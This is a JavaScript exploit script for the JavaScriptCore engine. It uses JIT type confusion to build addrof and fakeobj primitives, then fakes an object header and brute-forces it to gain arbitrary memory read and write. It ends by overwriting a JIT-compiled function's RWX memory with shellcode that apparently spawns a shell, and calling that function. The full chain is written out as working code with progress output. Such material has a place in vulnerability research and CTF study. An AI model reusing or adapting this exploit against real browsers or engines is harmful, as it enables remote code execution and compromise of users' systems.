// creating new float table and adding property
a = [13.37, 13.37]
a.to_delete = 42

function retElem() {
    return a[0];
}

function setElem(val) {
    a[0] = val;
}

// forcing JIT optimization of retElem and setElem
for (var i = 0;  i < 100000; i++)
{
    retElem();
    setElem(13.38);
}

delete a.to_delete
a[0] = {}

function addrof(obj) {
    a[0] = obj
    return Int64.fromDouble(retElem());
}

function fakeobj(addr) {
    setElem(addr.asDouble());
    return a[0];
}

// spraying Array containing Float64
sprayed = []
for (var i = 0; i < 0x1000; i++) {
    var tmp = [13.37];
    tmp.pointer = (new Int64(0x1234)).asDouble();
    tmp['prop_' + i] = 13.37;
    sprayed.push(tmp);
  }
victim = sprayed[0x800];
victim_addr = addrof(victim);
print(`[*] victim : ${victim_addr}`);
print(`[*] initial victim.pointer value: ${victim.pointer}`);

// definition in JSCell.h:274
var jscellhdr = new Int64([
    0x00, 0x10, 0x00, 0x00,	// m_structureID
    0x07,                   // m_indexing_type
    0x20,                   // m_type
    0x08,                   // m_flags
    0x01                    // m_cellstate
]);
var fake = {
    jscellhdr: jscellhdr.asJSValue(),
    butterfly:  victim
}

addr = Add(addrof(fake), 16);
print(`[*] fake ArrayType : ${addr}`);
exploit = fakeobj(addr);

// bruteforcing jscellhdr value (will not be possible in latest version due to newly introduced entropy bits)
while (!(exploit instanceof Array)) {
    jscellhdr.assignAdd(jscellhdr, Int64.One);
    exploit.jscellhdr = jscellhdr.asJSValue();
}

// from this point, exploit[1] corresponds to victim's butterfly.
// reading at a specific address is done using address added to 0x10 to account for butterfly offset
orig_butterfly = exploit[1];

var memory = {
    // read 8 bytes
    read8: function(addr) {
        exploit[1] = Add(addr, 16).asDouble();
        return addrof(victim.pointer);
    },
    // write 8 bytes
    write8: function(addr, data) {
        exploit[1] = Add(addr, 16).asDouble();
        victim.pointer = data;
    }
}

// var test = {};
// test_addr = addrof(test);
// print(`[*] test is at ${test_addr}`);
// print(`[*] content of memory at ${test_addr} : ${memory.read8(test_addr)}`);
// var stuff = (new Int64("0xc0c1c2c3c4c5c6c7")).asDouble();
// memory.write8(test_addr, stuff);
// print(`[*] content of memory at ${test_addr} : ${memory.read8(test_addr)}`);


// creating JIT object that we will overwrite
function jitCompile(f, ...args) {
    for (var i = 0; i < 100000; i++) {
        f(...args);
    }
}
function makeJITCompiledFunction() {
    function target(num) {
        for (var i = 2; i < num; i++) {
            if (num % i === 0) {
                return false;
            }
        }
        return true;
    }
    jitCompile(target, 123);

    return target;
}

var func = makeJITCompiledFunction();
var funcAddr = addrof(func);

var f = makeJITCompiledFunction();
var f_addr = addrof(f);
var exec_addr = memory.read8(Add(f_addr, 24));
var jitcode_addr = memory.read8(Add(exec_addr, 24));
var rwx = memory.read8(Add(jitcode_addr, 32));
print(`[*] rwx buffer: ${rwx}`);

print(`[*] replacing JIT code with shellcode...`);
// var stuff = (new Int64("0xcccccccccccccccc")).asJSValue();
// memory.write8(rwx, stuff);
// all values used w/ asDouble() are real values-0x1000000000000 due to the way JSC stores them...
var shellcode = [(new Int64("0x9090909090909090")).asJSValue(), (new Int64("0x2fbe485099c03148")).asDouble(), 
    (new Int64("0x5767732f6e69622f")).asDouble(), (new Int64("0x4802b0f631485f54")).asJSValue(), (new Int64("0x90040f3bb028c8c1")).asDouble()];
for (var i = 0; i < shellcode.length; i++) {
    var code = shellcode[i];
    memory.write8(Add(rwx, i * 8), code);
}
print(`[*] jumping on shellcode...`)
var res = func();
